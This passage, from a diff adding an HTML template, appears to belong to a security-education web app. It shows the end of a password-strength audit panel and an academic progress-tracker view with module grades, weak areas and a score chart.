+                                <svg class="gauge-ring" viewBox="0 0 100 100">
+                                    <circle class="gauge-bg" cx="50" cy="50" r="42"></circle>
+                                    <circle id="gauge-bar" class="gauge-fill" cx="50" cy="50" r="42" style="stroke-dashoffset: 264;"></circle>
+                                </svg>
+                                <div class="gauge-text">
+                                    <span id="strength-score" class="score">0</span>
+                                    <span class="label">SCORE / 100</span>
+                                </div>
+                            </div>
+
+                            <div class="status-summary">
+                                <span class="label">CLASSIFICATION:</span>
+                                <span id="strength-label" class="badge-status label-weak">INSUFFICIENT DATA</span>
+                            </div>
+                        </div>
+
+                        <!-- Recommendations list -->
+                        <div class="suggestions-section">
+                            <h4>Audit Suggestions & Remediation:</h4>
+                            <ul id="password-suggestions" class="bullet-list suggestions-list">
+                                <li>Waiting for input to audit. Type credentials to retrieve feedback instantly.</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                </div>
+            </section>
+
+            <!-- ================== VIEW: PROGRESS ================== -->
+            <section id="view-progress" class="app-view">
+                <div class="view-header">
+                    <h2>Academic Progress Tracker</h2>
+                    <p class="view-subtitle">Inspect completed modules, overall exam stats, weak security subjects, and review performance graphs.</p>
+                </div>
+
+                <div class="progress-details-row">
+                    <!-- Text report summary card -->
+                    <div class="panel-card progress-summary-card">
+                        <div class="panel-header">
+                            <span class="tag">ACADEMIC_REPORT</span>
+                            <h3>Completed Syllabus Items</h3>
+                        </div>
+                        <div class="topics-summary-list">
+                            <div class="summary-metric">
+                                <span class="value" id="prog-completed-count">0</span>
+                                <span class="label">Completed Topics</span>
+                            </div>
+                            <div class="summary-metric">
+                                <span class="value" id="prog-average-score">0%</span>
+                                <span class="label">Exam Grade Average</span>
+                            </div>
+                        </div>
+
+                        <div class="list-container">
+                            <h4>Passed Modules (Grade >= 70%):</h4>
+                            <ul id="prog-passed-list" class="bullet-list completed-list">
+                                <li class="muted-li">No topics completed yet.</li>
+                            </ul>
+                        </div>
+
+                        <div class="list-container warning-container">
+                            <h4>Weak Areas (Grade < 70%):</h4>
+                            <ul id="prog-failed-list" class="bullet-list weak-list">
+                                <li class="muted-li">No weaknesses discovered. Keep it up!</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <!-- Canvas chart card -->
+                    <div class="panel-card progress-chart-card">
+                        <div class="panel-header">
+                            <span class="tag">METRICS_VISUALIZER</span>
+                            <h3>Topic Score Analysis</h3>
+                        </div>
+                        <div class="canvas-wrapper">
+                            <!-- Draw custom canvas grid -->
+                            <canvas id="progress-canvas" width="500" height="300"></canvas>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+        </main>
+    </div>
+
+    <!-- Script loading -->
+    <script src="{{ url_for('static', filename='js/app.js') }}"></script>
+</body>
+</html>
